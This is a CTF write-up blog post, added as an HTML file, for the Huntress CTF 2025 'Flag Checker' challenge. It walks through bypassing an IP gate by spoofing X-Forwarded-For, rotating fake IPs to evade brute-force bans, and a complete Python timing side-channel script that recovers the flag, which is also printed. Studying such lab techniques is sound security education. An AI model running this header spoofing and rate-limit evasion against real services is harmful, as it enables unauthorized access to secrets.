@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Favicon -->
+    <link rel="icon" href="/Cyb3Raya-Blog/favicon_ico/favicon.ico" type="image/x-icon" />
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Flag Checker - Timing Side-Channel via X-Forwarded-For</title>
+
+    <!-- Site CSS -->
+    <link rel="stylesheet" href="/Cyb3Raya-Blog/CSS/style.css" />
+    <link rel="stylesheet" href="/Cyb3Raya-Blog/CSS/blog.css" />
+
+    <!-- Prism (syntax highlighting) -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"
+      referrerpolicy="no-referrer"
+      integrity="sha384-wFjoQjtV1y5jVHbt0p35Ui8aV8GVpEZkyF99OXWqP/eNJDU93D3Ugxkoyh6Y2I4A"
+      crossorigin="anonymous"
+    />
+
+    <!-- Font Awesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+      referrerpolicy="no-referrer"
+      integrity="sha384-/o6I2CkkWC//PSjvWC/eYN7l3xM3tJm8ZzVkCOfp//W05QcE3mlGskpoHB6XqI+B"
+      crossorigin="anonymous"
+    />
+
+    <!-- Prism.js -->
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-06z5D//U/xpvxZHuUz92xBvq3DqBBFi7Up53HRrbV7Jlv7Yvh/MZ7oenfUe9iCEt"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-HkMr0bZB9kBW4iVtXn6nd35kO/L/dQtkkUBkL9swzTEDMdIe5ExJChVDSnC79aNA"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-9WmlN8ABpoFSSHvBGGjhvB3E/D8UkNB9HpLJjBQFC2VSQsM1odiQDv4NbEo+7l15"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-xbI9krqyYp4npK9Cn94XyNoSR+TYZKddrk0NUVZ44zZ+OVpKz/LL0U1PB0MjR7Vx"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-WJdEkJKrbsqw0evQ4GB6mlsKe5cGTxBOw4KAEIa52ZLB7DDpliGkwdme/HMa5n1m"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-D44bgYYKvaiDh4cOGlj1dbSDpSctn2FSUj118HZGmZEShZcO2v//Q5vvhNy206pp"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-RhrmFFMb0ZCHImjFMpR/UE3VEtIVTCtNrtKQqXCzqXZNJala02N3UbVhi+qzw3CY"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-AKAiycghK0jDCjD+aavMHzDkLzRR7Yzcwh3+xL/295cvyVMe+cxQfyQC8xxGGcI8"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-docker.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-44ggPevoK6FC5kDMdbbWoMCAFkSCwaRoXXtKMkslR2lf8Ra3OSzCRrFIyeK+TQBi"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-/MKWdycCDliku23mP5sYXbZNuXrzgmQO/jsVxwPFn99dVOaXRyKsqDjarqpueGAp"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-gaD4ncierlmWk42Z3BmTp37/z+Dqt8V4Wf74UjTvFeo+M+SgnEI6Ysd98pWhksQv"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-NiOrAquf32LSG3Vuig99LKS03EZPUuM8a51NOp+XXsqx08hUVo3wbNWALY7K/2J8"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-x86asm.min.js"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markdown.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-s888ApkYHxfPsp8n81g77Unl/0XYnYltLvWbwqKHcheRE8/dZPlT4IjW3mRGv/Hd"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-regex.min.js"
+      referrerpolicy="no-referrer"
+      integrity="sha384-Sho2oQIxeBFEBg9Vgym6dSGysMKFTg1pC0iIUEIUT4/BfbOxNfrxWlueMBO1ZeaR"
+      crossorigin="anonymous"
+    ></script>
+  </head>
+
+  <body>
+    <!-- Accessibility -->
+    <!-- <a href="#content" class="skip-link">Skip to content</a> -->
+
+    <header>
+      <!-- Navigation -->
+      <nav class="navbar" aria-label="Primary">
+        <div class="navbar-inner">
+          <div class="logo">
+            <a href="/Cyb3Raya-Blog/index.html">CYB3R4Y4</a>
+          </div>
+
+          <ul class="nav-links">
+            <li><a href="/Cyb3Raya-Blog/blog.html">Blog</a></li>
+            <li><a href="/Cyb3Raya-Blog/tags.html">Tags</a></li>
+            <li><a href="/Cyb3Raya-Blog/categories.html">Categories</a></li>
+            <li><a href="mailto:aj.raya@proton.me">Contact</a></li>
+          </ul>
+
+          <button class="theme-toggle" aria-label="Toggle theme">
+            <i id="theme-icon" class="fa-solid fa-sun" aria-hidden="true"></i>
+            <span class="sr-only">Toggle theme</span>
+          </button>
+        </div>
+      </nav>
+    </header>
+
+    <main id="content">
+      <section class="section">
+        <article class="post-container">
+          <h1>Flag Checker 🚩 - Timing Side-Channel via X-Forwarded-For</h1>
+
+          <div class="post-meta">
+            <span class="author"><i class="fa-solid fa-user"></i> AJ Raya</span>
+            <span class="date"
+              ><i class="fa-solid fa-calendar"></i> October 8, 2025</span
+            >
+          </div>
+
+          <div class="blog-meta-row">
+            <span class="blog-meta-label">Category:</span>
+            <a
+              href="/Cyb3Raya-Blog/categories.html#web-exploitation"
+              class="tag-pill category-pill"
+            >
+              Web Exploitation
+            </a>
+          </div>
+
+          <p class="muted tags-line">
+            Tags:
+            <a href="/Cyb3Raya-Blog/tags.html#huntress-ctf-2025" class="tag-pill">
+              Huntress CTF 2025
+            </a>
+            <a href="/Cyb3Raya-Blog/tags.html#timing-attacks" class="tag-pill">
+              Timing Attacks
+            </a>
+            <a href="/Cyb3Raya-Blog/tags.html#side-channels" class="tag-pill">
+              Side Channels
+            </a>
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/flag-checker-guy.png"
+              alt="Illustration of a person checking a flag"
+            />
+            <figcaption>Challenge art for Flag Checker.</figcaption>
+          </figure>
+
+          <p class="muted">
+            A walkthrough of the <code>Flag Checker</code> challenge, where we
+            bypass a proxy/IP gate with
+            <code class="inside-code">X-Forwarded-For</code> and then abuse a
+            timing side-channel to recover the flag one character at a time
+            while dodging brute-force controls.
+          </p>
+
+          <h2>Challenge Prompt</h2>
+
+          <p>
+            “We've decided to make this challenge really straight forward. All
+            you have to do is find out the flag!
+          </p>
+          <p>
+            Juuuust make sure not to trip any of the security controls
+            implemented to stop brute force attacks...”
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/chall-prompt.png"
+              alt="Screenshot of the challenge prompt"
+            />
+            <figcaption>
+              The prompt warns about brute-force controls.
+            </figcaption>
+          </figure>
+
+          <hr />
+
+          <h2>1. Core Idea</h2>
+
+          <p>The core behavior of the app looks like this:</p>
+
+          <ul>
+            <li>
+              The app only “trusts” requests that look like they come through a
+              proxy, by checking
+              <code class="inside-code">X-Forwarded-For</code>.
+            </li>
+            <li>
+              Once past that gate, the flag checker leaks a
+              <strong>timing side-channel</strong>: the response time grows as
+              more leading characters of a guess are correct.
+            </li>
+            <li>
+              We measure that timing to recover the flag one character at a
+              time, while rotating IPs to dodge bans and brute-force controls.
+            </li>
+          </ul>
+
+          <hr />
+
+          <h2>2. Recon - What’s running on the target?</h2>
+
+          <h3>a. Port scan</h3>
+
+          <p>First step: classic port scan against the challenge target.</p>
+
+          <pre><code class="language-bash">nmap -T4 -A -p- 10.1.160.39</code></pre>
+
+          <p>What we learned was open:</p>
+
+          <ul>
+            <li><strong>80/tcp</strong>: nginx (front door of the app)</li>
+            <li><strong>5000/tcp</strong>: Flask/Werkzeug (the app itself)</li>
+            <li><strong>22/tcp</strong>: SSH</li>
+          </ul>
+
+          <h3>b. First look at the app</h3>
+
+          <p>
+            Hit the app directly and submit anything as the
+            <code class="inside-code">flag</code> parameter just to see how it
+            responds:
+          </p>
+
+          <pre><code class="language-bash">curl -i "http://10.1.160.39:5000/submit?flag=flag"</code></pre>
+
+          <p><strong>Observation:</strong></p>
+
+          <p>
+            The response is tiny and literally says
+            <strong>“X-FORWARDED-FOR Header not present.”</strong>
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/not-present.png"
+              alt="Response showing X-FORWARDED-FOR Header not present"
+            />
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/not-present2.png"
+              alt="Another view showing missing X-FORWARDED-FOR header error"
+            />
+            <figcaption>
+              The backend refuses to do anything unless
+              <code class="inside-code">X-Forwarded-For</code> is present.
+            </figcaption>
+          </figure>
+
+          <p>
+            Browser DevTools confirmed the same behavior: there was no forward
+            header on the request, and the page just complained about the
+            missing
+            <code class="inside-code">X-FORWARDED-FOR</code> header.
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/devtools-headers.png"
+              alt="DevTools headers showing missing X-Forwarded-For"
+            />
+            <figcaption>
+              DevTools confirms the request was missing the forwarded header.
+            </figcaption>
+          </figure>
+
+          <p>
+            Conceptually this is straightforward: the app is refusing requests
+            unless an
+            <a
+              href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For"
+              target="_blank"
+              class="any-link"
+              rel="noopener noreferrer"
+              referrerpolicy="no-referrer"
+            >
+              X-Forwarded-For
+            </a>
+            (or similar proxy IP) header is present.
+          </p>
+
+          <p>
+            So the trick is to make the server <em>think</em> the request came
+            from a trusted IP by adding the forwarded header (or one of the
+            other IP headers apps commonly check).
+          </p>
+
+          <hr />
+
+          <h2>3. Bypassing the proxy/IP gate</h2>
+
+          <p>
+            Web servers behind reverse proxies often trust
+            <code class="inside-code">X-Forwarded-For</code> (and/or
+            <code class="inside-code">X-Real-IP</code>) to read the
+            <em>original</em> client IP.
+          </p>
+
+          <p>
+            Let’s spoof being “local” by setting it to <code>127.0.0.1</code>:
+          </p>
+
+          <pre><code class="language-bash">curl -i -H "X-Forwarded-For: 127.0.0.1" \
+  "http://10.1.160.39:5000/submit?flag=testing"</code></pre>
+
+          <p><strong>What changes:</strong></p>
+
+          <ul>
+            <li>We no longer see the tiny “missing header” page.</li>
+            <li>
+              We get a full HTML page with a message -
+              <strong>“Not Quite!”</strong>
+            </li>
+          </ul>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/not-quite.png"
+              alt="Full HTML response showing Not Quite"
+            />
+            <figcaption>
+              Gate passed: once the app sees a trusted-looking client IP, it
+              shows the full “Not Quite!” page.
+            </figcaption>
+          </figure>
+
+          <p>
+            Optional confirmation could have been done via port 80 (nginx
+            fronting the app):
+          </p>
+
+          <pre><code class="language-bash">curl -i -H "X-Forwarded-For: 127.0.0.1" \
+  "http://10.1.160.39/submit?flag=testing"</code></pre>
+
+          <p>For me, going straight to port <code>5000</code> sufficed.</p>
+
+          <p>
+            The app also has brute-force controls. If you’re too noisy, you may
+            see something like:
+            <strong>“Stop Hacking! Your IP has been blocked.”</strong>
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/stop-hacking.png"
+              alt="Stop Hacking message indicating IP blocked"
+            />
+            <figcaption>
+              Brute force / rate-limiting logic kicking in when one IP sends too
+              many guesses.
+            </figcaption>
+          </figure>
+
+          <p>
+            If that happens, you can rotate the apparent client IP by changing
+            <code class="inside-code">X-Forwarded-For</code> and
+            <code class="inside-code">X-Real-IP</code>:
+          </p>
+
+          <pre><code class="language-bash">curl -i \
+  -H "X-Forwarded-For: 10.23.45.67" \
+  -H "X-Real-IP: 172.20.14.88" \
+  -H "Connection: close" \
+  --cookie "" --cookie-jar /dev/null \
+  "http://10.1.160.39:5000/submit?flag=test"</code></pre>
+
+          <hr />
+
+          <h2>4. Spotting the side-channel (timing leak)</h2>
+
+          <p>
+            With the gate bypassed, the next step is to look at what the
+            response reveals.
+          </p>
+
+          <p>
+            The app helpfully sets an
+            <code class="inside-code">X-Response-Time</code> header in each
+            response (e.g., <code>0.000969</code>).
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/xresponse-time.png"
+              alt="DevTools showing X-Response-Time header"
+            />
+            <figcaption>
+              The app exposes <code class="inside-code">X-Response-Time</code>,
+              which we can treat as a built-in timing oracle.
+            </figcaption>
+          </figure>
+
+          <p>
+            Even if that header weren’t present, you could always measure
+            <a
+              href="https://en.wikipedia.org/wiki/Elapsed_real_time"
+              class="any-link"
+              target="_blank"
+              rel="noopener noreferrer"
+              referrerpolicy="no-referrer"
+            >
+              wall-clock
+            </a>
+            time yourself.
+          </p>
+
+          <p><strong>Hypothesis:</strong></p>
+
+          <p>
+            Many “flag checkers” compare your guess to the real flag
+            <strong>character-by-character</strong> and stop at the first
+            mismatch. If your prefix is longer and correct, it takes longer
+            before it fails.
+          </p>
+
+          <p>
+            Time reveals how many leading characters you got right - that's the
+            side-channel.
+          </p>
+
+          <hr />
+
+          <h2>5. Building a simple timing experiment</h2>
+
+          <p>
+            Next, I wanted to confirm whether timing really grows with the
+            length of the correct prefix.
+          </p>
+
+          <p>
+            You can do a quick test with
+            <code class="inside-code">curl</code> and the
+            <code class="inside-code">X-Response-Time</code> header:
+          </p>
+
+          <pre><code class="language-bash">curl -s -D - -H "X-Forwarded-For: 127.0.0.1" \
+  "http://10.1.160.39:5000/submit?flag=flag{" \
+  -o /dev/null | grep -i x-response-time</code></pre>
+
+          <p>
+            Then try <code class="inside-code">flag{0</code>,
+            <code class="inside-code">flag{1</code>, and compare. You’ll see
+            clusters of times.
+          </p>
+
+          <p>That’s your signal.</p>
+
+          <p>
+            <strong>Important:</strong> the server adds rate limits and bans.
+            After enough requests from one IP, it will complain about hacking
+            and block you. The hint explicitly says to change IP if you get
+            banned.
+          </p>
+
+          <p>
+            Since the app trusts
+            <code class="inside-code">X-Forwarded-For</code>, we can rotate the
+            <em>apparent</em> IP by changing the header value on each request
+            (e.g., <code>10.x.x.x</code>, <code>172.16.x.x</code>,
+            <code>192.168.x.x</code>).
+          </p>
+
+          <hr />
+
+          <h2>6. Turning the signal into an attack</h2>
+
+          <h3>a. Strategy</h3>
+
+          <p>The high-level strategy for the script looks like this:</p>
+
+          <ul>
+            <li>
+              Always send <code class="inside-code">X-Forwarded-For</code> (and
+              rotate it every request).
+            </li>
+            <li>For position <em>i</em> of the flag:</li>
+            <li>
+              Measure a <strong>baseline</strong>: timing for the current
+              prefix.
+            </li>
+            <li>Try every candidate next char, several times each.</li>
+            <li>
+              Compute the <strong>delta</strong>:
+              <code>candidate_median - baseline_median</code>.
+            </li>
+            <li>Pick the char with the largest positive delta.</li>
+            <li>
+              <strong>Confirm</strong> it with extra trials before locking it
+              in.
+            </li>
+            <li>
+              Only accept <strong>32 hex characters</strong> inside the braces
+              (known format), then append <code>}</code> and POST the result to
+              verify.
+            </li>
+          </ul>
+
+          <p>
+            Why 32 hex? Previous flags followed
+            <code>flag{&lt;32 hex&gt;}</code>. Enforcing that prevents the
+            script from choosing <code>}</code> too early due to noise.
+          </p>
+
+          <h3>b. The working script</h3>
+
+          <p>
+            Based on all this, I asked ChatGPT to draft a Python script to
+            automate the attack, then saved it as
+            <code class="inside-code">flag_checker.py</code>:
+          </p>
+
+          <pre><code class="language-python">#!/usr/bin/env python3
+import requests, random, time, os
+from statistics import median
+
+BASE_GET  = "http://10.1.160.39:5000/submit?flag="
+BASE_POST = "http://10.1.160.39:5000/submit"
+UA        = "timing-oracle/strict-hex/1.0"
+START     = "flag{"
+HEX       = "0123456789abcdef"
+HEX_LEN   = 32
+TRIALS_BASE    = 8
+TRIALS_CAND    = 8
+TRIALS_CONFIRM = 12
+TIMEOUT   = 6.0
+JITTER    = (0.06, 0.14)
+IGNORE_SZ = 69
+RESUME    = "progress.txt"
+
+S = requests.Session()
+S.headers.update({"User-Agent": UA})
+
+def rand_ip():
+    pool = random.choice([
+        (10, random.randint(0,255), random.randint(0,255), random.randint(1,254)),
+        (172, random.randint(16,31), random.randint(0,255), random.randint(1,254)),
+        (192,168, random.randint(0,255), random.randint(1,254)),
+        (127,0,0,1),
+    ])
+    return ".".join(map(str, pool))
+
+def hit(candidate):
+    hdr = {"X-Forwarded-For": rand_ip(), "X-Real-IP": rand_ip()}
+    t0 = time.perf_counter()
+    r  = S.get(BASE_GET + candidate, headers=hdr, timeout=TIMEOUT)
+    wall = time.perf_counter() - t0
+    xr = r.headers.get("X-Response-Time")
+    try:
+        xrf = float(xr) if xr else None
+    except Exception:
+        xrf = None
+    return r.status_code, len(r.text), xrf, wall
+
+def run_trials(candidate, n):
+    vals = []
+    while len(vals) < n:
+        sc, sz, xrf, wall = hit(candidate)
+        if sc is None or sz == IGNORE_SZ or wall < 0.002:
+            time.sleep(0.05)
+            continue
+        vals.append((xrf if xrf is not None else wall, wall, sz))
+        time.sleep(random.uniform(*JITTER))
+    return vals
+
+def med_time(vals):
+    return median([v[0] for v in vals]) if vals else 0.0
+
+def baseline(prefix):
+    return med_time(run_trials(prefix, TRIALS_BASE))
+
+def load():
+    if os.path.exists(RESUME):
+        p = open(RESUME, "r", encoding="utf-8").read().strip()
+        if p.startswith(START):
+            return p
+    return START
+
+def save(p):
+    open(RESUME, "w", encoding="utf-8").write(p)
+
+def main():
+    prefix = load()
+    print("[*] resume:", prefix)
+    while len(prefix) < len(START) + HEX_LEN:
+        base = baseline(prefix)
+        print(f"[+] baseline({prefix!r})={base:.6f}")
+        best_c, best_delta = None, -1e9
+
+        for ch in HEX:
+            m   = med_time(run_trials(prefix + ch, TRIALS_CAND))
+            dlt = m - base
+            print(f"    try {prefix+ch!r} -> med={m:.6f} delta={dlt:.6f}")
+            if dlt > best_delta:
+                best_delta, best_c = dlt, ch
+
+        conf = med_time(run_trials(prefix + best_c, TRIALS_CONFIRM))
+        if conf - base < 0.003:
+            print(f"[!] weak signal for {best_c!r}; retrying...")
+            time.sleep(1.2)
+            continue
+
+        prefix += best_c
+        save(prefix)
+        print(f"[+] accept {best_c!r} -> {prefix!r}")
+        time.sleep(0.6 + random.uniform(0.1, 0.3))
+
+    candidate = prefix + "}"
+    print("[*] completed 32 hex; testing closing brace...")
+    if med_time(run_trials(candidate, TRIALS_CONFIRM)) - baseline(prefix) < 0.003:
+        print("[!] brace not clearly better; try again shortly.")
+        time.sleep(1.5)
+    else:
+        prefix = candidate
+        save(prefix)
+        print(f"[+] candidate flag: {prefix}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+          <p>Then, run the script:</p>
+
+          <pre><code class="language-bash">python3 flag_checker.py</code></pre>
+
+          <p>
+            The script prints baselines, tries each candidate character,
+            confirms the best one, and appends it to the prefix. It won’t accept
+            <code>}</code> early; it requires exactly 32 hex characters first,
+            then tests the closing brace.
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/baseline.png"
+              alt="Terminal output showing baseline timings and candidate deltas"
+            />
+            <figcaption>
+              The timing oracle in action: baselines, candidate medians, and
+              deltas while reconstructing the flag.
+            </figcaption>
+          </figure>
+
+          <hr />
+
+          <h2>7. Flag Checker</h2>
+
+          <p>
+            After a slow grind, it finally completed and recovered the flag.
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/flaggy.png"
+              alt="Web app confirming the correct flag"
+            />
+            <figcaption>Flag confirmed by the challenge.</figcaption>
+          </figure>
+
+          <p>
+            The flag was:
+            <code class="inside-code"
+              >flag{77ba0346d9565e77344b9fe40ecf1369}</code
+            >
+          </p>
+
+          <figure>
+            <img
+              src="/Cyb3Raya-Blog/Images/flag-checker/completed.png"
+              alt="Congratulations screen after solving the challenge"
+            />
+            <figcaption>
+              Challenge complete. Timing leak + rotated IPs = W.
+            </figcaption>
+          </figure>
+
+          <hr />
+
+          <h2>8. Extra notes</h2>
+
+          <h3>What is <code>X-Forwarded-For</code>?</h3>
+
+          <p>
+            It’s a header added by proxies to record the original client IP
+            (e.g.,
+            <code>1.2.3.4, proxy-ip</code>). Apps behind proxies often read it
+            to figure out who really connected. Here, the app refuses to run
+            unless this header is present.
+          </p>
+
+          <h3>What is a timing attack?</h3>
+
+          <p>
+            Any time the server’s processing time depends on how “close” your
+            guess is to a secret, you can use timing to recover that secret
+            character-by-character. Measuring medians of multiple trials helps
+            smooth out network noise.
+          </p>
+
+          <h3>Why rotate IPs?</h3>
+
+          <p>
+            The app bans IPs that send too many guesses. Rotating the apparent
+            client IP in
+            <code class="inside-code">X-Forwarded-For</code> lets you keep going
+            while sidestepping per-IP rate limits.
+          </p>
+        </article>
+      </section>
+    </main>
+
+    <!-- Fullscreen image modal -->
+    <div class="image-modal" id="image-modal" aria-hidden="true">
+      <button class="image-modal-close" aria-label="Close image">
+        &times;
+      </button>
+      <img src="" alt="" />
+    </div>
+
+    <footer class="footer">
+      <span>&copy; 2025 AJ Raya. All rights reserved.</span>
+      <a href="/Cyb3Raya-Blog/privacy.html">Privacy Policy</a>
+    </footer>
+
+    <!-- Theme toggle (keyboard-friendly) -->
+    <script>
+      const themeToggle = document.querySelector(".theme-toggle");
+      const themeIcon = document.getElementById("theme-icon");
+      const storedTheme = localStorage.getItem("theme");
+
+      if (themeToggle && themeIcon) {
+        function enableDark() {
+          document.body.classList.add("dark-mode");
+          themeIcon.classList.replace("fa-sun", "fa-moon");
+        }
+
+        function enableLight() {
+          document.body.classList.remove("dark-mode");
+          themeIcon.classList.replace("fa-moon", "fa-sun");
+        }
+
+        if (
+          storedTheme === "dark" ||
+          (!storedTheme &&
+            window.matchMedia("(prefers-color-scheme: dark)").matches)
+        ) {
+          enableDark();
+        } else {
+          enableLight();
+        }
+
+        function toggleTheme() {
+          if (document.body.classList.contains("dark-mode")) {
+            enableLight();
+            localStorage.setItem("theme", "light");
+          } else {
+            enableDark();
+            localStorage.setItem("theme", "dark");
+          }
+        }
+
+        themeToggle.addEventListener("click", toggleTheme);
+        themeToggle.addEventListener("keydown", (e) => {
+          if (e.key === "Enter" || e.key === " ") {
+            e.preventDefault();
+            toggleTheme();
+          }
+        });
+      }
+    </script>
+
+    <!-- Image zoom modal logic -->
+    <script>
+      (function () {
+        const modal = document.getElementById("image-modal");
+        if (!modal) return;
+
+        const modalImg = modal.querySelector("img");
+        const closeBtn = modal.querySelector(".image-modal-close");
+
+        function openModal(src, alt) {
+          modalImg.src = src;
+          modalImg.alt = alt || "";
+          modal.classList.add("open");
+          modal.setAttribute("aria-hidden", "false");
+          document.body.style.overflow = "hidden";
+        }
+
+        function closeModal() {
+          modal.classList.remove("open");
+          modal.setAttribute("aria-hidden", "true");
+          modalImg.src = "";
+          document.body.style.overflow = "";
+        }
+
+        document.querySelectorAll(".post-container img").forEach((img) => {
+          img.addEventListener("click", () => openModal(img.src, img.alt));
+        });
+
+        modal.addEventListener("click", (e) => {
+          if (e.target === modal || e.target === closeBtn) closeModal();
+        });
+
+        document.addEventListener("keydown", (e) => {
+          if (e.key === "Escape" && modal.classList.contains("open"))
+            closeModal();
+        });
+      })();
+    </script>
+
+    <!-- Code block copy buttons -->
+    <script>
+      (function () {
+        const codeBlocks = document.querySelectorAll(
+          ".post-container pre > code"
+        );
+        if (!codeBlocks.length) return;
+
+        codeBlocks.forEach((code) => {
+          const pre = code.parentElement;
+          if (!pre) return;
+
+          pre.classList.add("code-block");
+
+          const btn = document.createElement("button");
+          btn.type = "button";
+          btn.className = "code-copy-btn";
+          btn.innerHTML = `
+            <i class="fa-regular fa-clipboard"></i>
+            <span>Copy</span>
+          `;
+
+          btn.addEventListener("click", async () => {
+            const text = code.innerText || code.textContent || "";
+
+            const copy = async () => {
+              if (navigator.clipboard && navigator.clipboard.writeText) {
+                return navigator.clipboard.writeText(text);
+              }
+
+              const textarea = document.createElement("textarea");
+              textarea.value = text;
+              textarea.style.position = "fixed";
+              textarea.style.left = "-9999px";
+              document.body.appendChild(textarea);
+              textarea.select();
+              try {
+                document.execCommand("copy");
+              } finally {
+                document.body.removeChild(textarea);
+              }
+            };
+
+            try {
+              await copy();
+              btn.classList.add("copied");
+              btn.innerHTML = `
+                <i class="fa-solid fa-check"></i>
+                <span>Copied</span>
+              `;
+              setTimeout(() => {
+                btn.classList.remove("copied");
+                btn.innerHTML = `
+                  <i class="fa-regular fa-clipboard"></i>
+                  <span>Copy</span>
+                `;
+              }, 1500);
+            } catch (err) {
+              console.error("Copy failed:", err);
+              btn.classList.add("copied");
+              btn.innerHTML = `
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <span>Error</span>
+              `;
+              setTimeout(() => {
+                btn.classList.remove("copied");
+                btn.innerHTML = `
+                  <i class="fa-regular fa-clipboard"></i>
+                  <span>Copy</span>
+                `;
+              }, 2000);
+            }
+          });
+
+          pre.appendChild(btn);
+        });
+      })();
+    </script>
+  </body>
+</html>
